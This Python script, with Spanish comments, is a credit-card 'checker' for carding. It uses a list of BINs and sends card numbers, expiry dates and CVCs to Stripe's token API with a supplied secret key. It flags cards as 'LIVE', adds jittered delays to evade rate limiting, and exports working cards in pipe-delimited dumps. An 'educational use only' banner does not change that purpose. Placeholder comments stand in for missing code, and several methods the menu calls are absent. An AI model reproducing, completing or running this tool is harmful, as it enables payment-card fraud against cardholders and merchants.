#!/usr/bin/env python3
import requests
import json
import random
import time
import os
import sqlite3
from datetime import datetime
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class CCChecker:
    def __init__(self):
        self.sk = ""
        self.bins = []
        self.generated_cards = []
        self.valid_cards = []
        self.bin_cache = {}
        self.setup_database()
        self.load_bins()
        
    def setup_database(self):
        """Configura base de datos SQLite para cache de BINs"""
        self.conn = sqlite3.connect('bin_cache.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS bin_cache (
                bin TEXT PRIMARY KEY,
                type TEXT,
                brand TEXT,
                bank TEXT,
                country TEXT,
                country_code TEXT,
                valid INTEGER,
                source TEXT,
                timestamp DATETIME
            )
        ''')
        self.conn.commit()
    
    def load_bins(self):
        # BINs predefinidos para diferentes países
        self.bins = [
            # USA - Visa
            "411111", "424242", "453201", "491748", "455673", "402400", "448562",
            # USA - MasterCard
            "555555", "510510", "520082", "542523", "550692", "530125",
            # UK
            "400005", "511151", "522222", "533333", "544444",
            # Canada
            "453202", "450903", "462294", "403000", "410039",
            # Australia
            "516320", "516345", "527458", "535231", "543111",
            # Internacional
            "371449", "343434", "378282", "361111", "356600",
            # BINs reales comunes
            "453957", "471604", "402944", "448430", "455676",
            "516292", "516293", "516294", "542418", "542419"
        ]
    
    def bin_lookup(self, bin_number):
        """Consulta información del BIN con múltiples fuentes y cache"""
        # Verificar cache primero
        cached = self.get_cached_bin(bin_number)
        if cached:
            return cached
        
        # Intentar múltiples APIs
        apis = [
            self.binlist_api,
            self.binlist_net_api,
            self.abstractapi
        ]
        
        for api_func in apis:
            try:
                result = api_func(bin_number)
                if result and result['valid']:
                    self.cache_bin(bin_number, result)
                    return result
            except:
                continue
        
        # Fallback final
        fallback = self.get_fallback_bin_info(bin_number)
        self.cache_bin(bin_number, fallback)
        return fallback
    
    def get_cached_bin(self, bin_number):
        """Obtiene BIN del cache"""
        self.cursor.execute('SELECT * FROM bin_cache WHERE bin = ?', (bin_number,))
        row = self.cursor.fetchone()
        if row:
            # Verificar si el cache es reciente (menos de 30 días)
            cache_time = datetime.fromisoformat(row[8])
            if (datetime.now() - cache_time).days < 30:
                return {
                    'type': row[1],
                    'brand': row[2],
                    'bank': row[3],
                    'country': row[4],
                    'country_code': row[5],
                    'valid': bool(row[6]),
                    'source': row[7]
                }
        return None
    
    def cache_bin(self, bin_number, data):
        """Guarda BIN en cache"""
        self.cursor.execute('''
            INSERT OR REPLACE INTO bin_cache 
            (bin, type, brand, bank, country, country_code, valid, source, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            bin_number, data['type'], data['brand'], data['bank'],
            data['country'], data['country_code'], int(data['valid']),
            data['source'], datetime.now()
        ))
        self.conn.commit()
    
    def binlist_api(self, bin_number):
        """API de binlist.net"""
        try:
            response = requests.get(
                f"https://lookup.binlist.net/{bin_number}",
                headers={'Accept-Version': '3', 'User-Agent': 'Mozilla/5.0'},
                timeout=3
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'type': data.get('scheme', 'Unknown').upper(),
                    'brand': data.get('brand', 'Unknown'),
                    'bank': data.get('bank', {}).get('name', 'Unknown'),
                    'country': data.get('country', {}).get('name', 'Unknown'),
                    'country_code': data.get('country', {}).get('alpha2', 'XX'),
                    'valid': True,
                    'source': 'binlist.net'
                }
        except:
            pass
        return None
    
    def binlist_net_api(self, bin_number):
        """API alternativa de binlist.net"""
        try:
            response = requests.get(
                f"https://binlist.net/lookup/{bin_number}/",
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=3
            )
            if response.status_code == 200:
                # Parsear respuesta HTML simple
                return self.get_fallback_bin_info(bin_number)
        except:
            pass
        return None
    
    def abstractapi(self, bin_number):
        """Simulación de API premium (requeriría API key)"""
        # Esta es una simulación - necesitarías una API key real
        return None
    
    def get_fallback_bin_info(self, bin_number):
        """Información de respaldo cuando las APIs fallan"""
        bin_data = {
            "4": {"type": "VISA", "brand": "VISA", "country": "USA", "bank": "VISA"},
            "51": {"type": "MASTERCARD", "brand": "MASTERCARD", "country": "USA", "bank": "MASTERCARD"},
            "52": {"type": "MASTERCARD", "brand": "MASTERCARD", "country": "USA", "bank": "MASTERCARD"},
            "53": {"type": "MASTERCARD", "brand": "MASTERCARD", "country": "USA", "bank": "MASTERCARD"},
            "54": {"type": "MASTERCARD", "brand": "MASTERCARD", "country": "USA", "bank": "MASTERCARD"},
            "55": {"type": "MASTERCARD", "brand": "MASTERCARD", "country": "USA", "bank": "MASTERCARD"},
            "34": {"type": "AMEX", "brand": "AMERICAN EXPRESS", "country": "USA", "bank": "AMEX"},
            "37": {"type": "AMEX", "brand": "AMERICAN EXPRESS", "country": "USA", "bank": "AMEX"},
            "36": {"type": "DINERS", "brand": "DINERS CLUB", "country": "INTERNATIONAL", "bank": "DINERS CLUB"},
            "30": {"type": "DINERS", "brand": "DINERS CLUB", "country": "INTERNATIONAL", "bank": "DINERS CLUB"},
            "60": {"type": "DISCOVER", "brand": "DISCOVER", "country": "USA", "bank": "DISCOVER"},
            "65": {"type": "DISCOVER", "brand": "DISCOVER", "country": "USA", "bank": "DISCOVER"},
            "35": {"type": "JCB", "brand": "JCB", "country": "JAPAN", "bank": "JCB"},
        }
        
        for prefix, info in bin_data.items():
            if bin_number.startswith(prefix):
                return {
                    'type': info['type'],
                    'brand': info['brand'],
                    'bank': info['bank'],
                    'country': info['country'],
                    'country_code': 'US',
                    'valid': True,
                    'source': 'FALLBACK'
                }
        
        return {
            'type': 'UNKNOWN',
            'brand': 'UNKNOWN',
            'bank': 'Unknown',
            'country': 'Unknown',
            'country_code': 'XX',
            'valid': False,
            'source': 'FALLBACK'
        }

    # ... (mantener las mismas funciones anteriores como set_stripe_key, generate_cc, luhn_complete, etc.)

    def validate_single_cc(self, cc_data):
        """Valida una sola tarjeta con Stripe y detección inteligente de LIVE"""
        if not self.sk:
            return False, False, "No SK configured"
        
        try:
            headers = {
                'Authorization': f'Bearer {self.sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'card[number]': cc_data['number'],
                'card[exp_month]': cc_data['exp_month'],
                'card[exp_year]': cc_data['exp_year'],
                'card[cvc]': cc_data['cvc']
            }
            
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data,
                timeout=15
            )
            
            is_valid = False
            is_live = False
            message = ""
            
            if response.status_code == 200:
                is_valid = True
                response_data = response.json()
                
                # Análisis avanzado para detectar tarjetas LIVE
                if 'card' in response_data:
                    card_info = response_data['card']
                    
                    # Detección de tarjetas de prueba vs reales
                    test_indicators = [
                        card_info.get('brand') == 'Unknown',
                        card_info.get('funding') == 'unknown',
                        'test' in str(card_info).lower(),
                        cc_data['number'].startswith('424242')  # BIN de prueba de Stripe
                    ]
                    
                    # Si no hay indicadores de prueba, probablemente es LIVE
                    if not any(test_indicators):
                        is_live = True
                        message = "LIVE - Tarjeta real detectada"
                    else:
                        message = "Valid - Tarjeta de prueba"
                else:
                    message = "Valid - Respuesta inusual"
                    
            elif response.status_code == 402:
                # Payment required - a veces indica tarjeta real pero con fondos insuficientes
                error_data = response.json().get('error', {})
                if error_data.get('code') == 'incorrect_number':
                    message = "Invalid - Número incorrecto"
                elif error_data.get('code') == 'invalid_expiry_month':
                    message = "Invalid - Mes de expiración inválido"
                else:
                    message = f"Invalid - {error_data.get('message', 'Error de pago')}"
            else:
                message = f"Invalid - HTTP {response.status_code}"
                
            return is_valid, is_live, message
                
        except requests.exceptions.Timeout:
            return False, False, "Timeout - Servidor no responde"
        except requests.exceptions.ConnectionError:
            return False, False, "Connection Error - Sin conexión"
        except Exception as e:
            return False, False, f"Error: {str(e)}"
    
    def validate_generated_cards(self):
        """Valida todas las tarjetas generadas con rate limiting inteligente"""
        if not self.sk:
            print(f"{Fore.RED}✗ Primero configura el Stripe Secret Key")
            return
        
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas para validar")
            return
        
        print(f"\n{Fore.CYAN}=== VALIDANDO {len(self.generated_cards)} TARJETAS ===")
        print(f"{Fore.YELLOW}Usando rate limiting inteligente...")
        
        valid_count = 0
        live_count = 0
        total = len(self.generated_cards)
        
        for i, card in enumerate(self.generated_cards, 1):
            # Mostrar información básica de la tarjeta
            bin_status = f"{Fore.GREEN}✓" if card['bin_valid'] else f"{Fore.RED}✗"
            print(f"{Fore.WHITE}[{i}/{total}] {bin_status} {card['number']} | {card['card_type']} | {card['country']}... ", end="")
            
            is_valid, is_live, message = self.validate_single_cc(card)
            card['stripe_valid'] = is_valid
            card['live'] = is_live
            card['validation_message'] = message
            
            # 🎨 APLICACIÓN DEL SISTEMA DE COLORES 🎨
            if is_live:
                # TARJETA LIVE - COLOR VERDE
                print(f"{Fore.GREEN}LIVE ✓")
                live_count += 1
                valid_count += 1
                self.valid_cards.append(card)
            elif is_valid:
                # TARJETA VÁLIDA - COLOR AZUL/CIAN
                print(f"{Fore.CYAN}VÁLIDA ✓")
                valid_count += 1
                self.valid_cards.append(card)
            else:
                # TARJETA INVÁLIDA - COLOR ROJO
                print(f"{Fore.RED}INVÁLIDA ✗")
            
            # Rate limiting inteligente
            delay = self.calculate_dynamic_delay(i, total)
            time.sleep(delay)
        
        # Mostrar resumen con colores
        print(f"\n{Fore.GREEN}=== VALIDACIÓN COMPLETADA ===")
        print(f"{Fore.WHITE}Total procesadas: {total}")
        print(f"{Fore.CYAN}Válidas: {valid_count}")
        print(f"{Fore.GREEN}LIVE: {live_count}")
        print(f"{Fore.RED}Inválidas: {total - valid_count}")
        print(f"{Fore.YELLOW}Tasa de éxito: {(valid_count/total)*100:.2f}%")
        print(f"{Fore.MAGENTA}Tasa LIVE: {(live_count/max(valid_count,1))*100:.2f}%")
    
    def calculate_dynamic_delay(self, current, total):
        """Calcula delay dinámico para evitar rate limiting"""
        base_delay = 0.5
        
        # Aumentar delay cada 10 tarjetas
        if current % 10 == 0:
            base_delay = 2.0
        # Delay más largo cada 50 tarjetas
        elif current % 50 == 0:
            base_delay = 5.0
        
        # Delay aleatorio para evitar patrones
        jitter = random.uniform(0.1, 0.3)
        return base_delay + jitter

    # ... (mantener las otras funciones como generate_multiple_cc, show_generated_cards, etc.)

    def show_generated_cards(self):
        """Muestra las tarjetas generadas aplicando el sistema de colores"""
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas")
            return
        
        print(f"\n{Fore.CYAN}=== TARJETAS GENERADAS ({len(self.generated_cards)}) ===")
        print(f"{Fore.YELLOW}🎨 SISTEMA DE COLORES: {Fore.GREEN}LIVE {Fore.CYAN}VÁLIDA {Fore.RED}INVÁLIDA {Fore.WHITE}NO VALIDADA")
        
        for i, card in enumerate(self.generated_cards, 1):
            # 🎨 SISTEMA DE COLORES SEGÚN ESTADO 🎨
            if card.get('live'):
                # VERDE - Tarjeta LIVE (real y funcional)
                color = Fore.GREEN
                status = "LIVE ✓"
                status_detail = card.get('validation_message', 'Tarjeta real')
            elif card.get('stripe_valid'):
                # AZUL/CIAN - Tarjeta válida (pasa validación pero puede ser de prueba)
                color = Fore.CYAN
                status = "VÁLIDA ✓"
                status_detail = card.get('validation_message', 'Tarjeta válida')
            elif card.get('stripe_valid') is False:
                # ROJO - Tarjeta inválida (no pasa validación)
                color = Fore.RED
                status = "INVÁLIDA ✗"
                status_detail = card.get('validation_message', 'Error en validación')
            else:
                # AMARILLO - Tarjeta no validada aún
                color = Fore.YELLOW
                status = "NO VALIDADA"
                status_detail = "Esperando validación"
            
            bin_status = f"{Fore.GREEN}✓" if card['bin_valid'] else f"{Fore.RED}✗"
            print(f"{i}. {bin_status} {color}{card['number']} | {card['exp_month']}/{card['exp_year']} | {card['cvc']} | {card['card_type']} | {card['country']} | {status}")
            print(f"   {color}↳ {status_detail}")

    def export_cards(self, format_type='txt'):
        """Exporta tarjetas en diferentes formatos"""
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas para exportar")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if format_type == 'json':
            filename = f"cc_results_{timestamp}.json"
            self.export_json(filename)
        elif format_type == 'csv':
            filename = f"cc_results_{timestamp}.csv"
            self.export_csv(filename)
        else:
            filename = f"cc_results_{timestamp}.txt"
            self.export_txt(filename)
        
        print(f"{Fore.GREEN}✓ Resultados exportados en {format_type.upper()}: {filename}")
    
    def export_json(self, filename):
        """Exporta en formato JSON"""
        export_data = {
            'metadata': {
                'export_date': datetime.now().isoformat(),
                'total_cards': len(self.generated_cards),
                'valid_cards': len([c for c in self.generated_cards if c.get('stripe_valid')]),
                'live_cards': len([c for c in self.generated_cards if c.get('live')])
            },
            'cards': self.generated_cards
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
    
    def export_csv(self, filename):
        """Exporta en formato CSV"""
        import csv
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Number', 'Exp_Month', 'Exp_Year', 'CVV', 'Type', 'Brand', 'Bank', 'Country', 'Status', 'BIN_Valid', '3D_Secure'])
            
            for card in self.generated_cards:
                status = "LIVE" if card.get('live') else "VALID" if card.get('stripe_valid') else "INVALID" if card.get('stripe_valid') is False else "UNCHECKED"
                writer.writerow([
                    card['number'],
                    card['exp_month'],
                    card['exp_year'],
                    card['cvc'],
                    card['card_type'],
                    card['card_brand'],
                    card['bank'],
                    card['country'],
                    status,
                    card['bin_valid'],
                    card['has_3d']
                ])
    
    def export_txt(self, filename):
        """Exporta en formato TXT organizado"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=== RESULTADOS DE TARJETAS ===\n")
            f.write(f"Exportado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total: {len(self.generated_cards)}\n\n")
            
            # Tarjetas LIVE
            live_cards = [card for card in self.generated_cards if card.get('live')]
            if live_cards:
                f.write("=== TARJETAS LIVE ===\n")
                for card in live_cards:
                    f.write(f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}|{card['card_type']}|{card['bank']}|{card['country']}|LIVE\n")
                f.write("\n")
            
            # Todas las tarjetas organizadas
            f.write("=== TODAS LAS TARJETAS ===\n")
            for card in self.generated_cards:
                status = "LIVE" if card.get('live') else "VÁLIDA" if card.get('stripe_valid') else "INVÁLIDA" if card.get('stripe_valid') is False else "NO VALIDADA"
                f.write(f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}|{card['card_type']}|{card['bank']}|{card['country']}|{status}|{card['bin_valid']}|{card['has_3d']}\n")

    def show_menu(self):
        print(f"\n{Fore.MAGENTA}=== CHECKER CC PROFESIONAL ===")
        print(f"{Fore.CYAN}SK Configurado: {'✓' if self.sk else '✗'}")
        print(f"{Fore.CYAN}Tarjetas en memoria: {len(self.generated_cards)}")
        valid_count = len([c for c in self.generated_cards if c.get('stripe_valid')])
        live_count = len([c for c in self.generated_cards if c.get('live')])
        print(f"{Fore.CYAN}Tarjetas válidas: {valid_count}")
        print(f"{Fore.GREEN}Tarjetas LIVE: {live_count}")
        print(f"{Fore.YELLOW}1. Configurar Stripe Secret Key")
        print(f"{Fore.YELLOW}2. Generar tarjetas (1-1000)")
        print(f"{Fore.YELLOW}3. Validar tarjetas generadas")
        print(f"{Fore.YELLOW}4. Mostrar todas las tarjetas")
        print(f"{Fore.YELLOW}5. Mostrar tarjetas válidas")
        print(f"{Fore.YELLOW}6. Mostrar tarjetas LIVE")
        print(f"{Fore.YELLOW}7. Estadísticas detalladas")
        print(f"{Fore.YELLOW}8. Exportar resultados (TXT/JSON/CSV)")
        print(f"{Fore.YELLOW}9. Probar BIN lookup")
        print(f"{Fore.YELLOW}0. Salir")
        
        choice = input(f"\n{Fore.GREEN}Selecciona una opción: ")
        return choice

    def run(self):
        print(f"{Fore.CYAN}Checker CC Profesional iniciado - Uso educativo")
        print(f"{Fore.RED}⚠️  SOLO USO EDUCATIVO EN ENTORNOS CONTROLADOS")
        
        while True:
            choice = self.show_menu()
            
            if choice == '1':
                self.set_stripe_key()
            elif choice == '2':
                self.generate_multiple_cc()
            elif choice == '3':
                self.validate_generated_cards()
            elif choice == '4':
                self.show_generated_cards()
            elif choice == '5':
                self.show_valid_cards()
            elif choice == '6':
                self.show_live_cards()
            elif choice == '7':
                self.show_statistics()
            elif choice == '8':
                print(f"\n{Fore.CYAN}Formatos de exportación:")
                print(f"{Fore.WHITE}1. TXT (Formato simple)")
                print(f"{Fore.WHITE}2. JSON (Estructurado)")
                print(f"{Fore.WHITE}3. CSV (Excel)")
                exp_choice = input("Selecciona formato (1/2/3): ")
                formats = {'1': 'txt', '2': 'json', '3': 'csv'}
                if exp_choice in formats:
                    self.export_cards(formats[exp_choice])
                else:
                    print(f"{Fore.RED}Formato inválido")
            elif choice == '9':
                self.test_bin_lookup()
            elif choice == '0':
                print(f"{Fore.GREEN}¡Hasta luego!")
                break
            else:
                print(f"{Fore.RED}Opción inválida")
            
            input(f"\n{Fore.YELLOW}Presiona Enter para continuar...")

if __name__ == "__main__":
    checker = CCChecker()
    checker.run()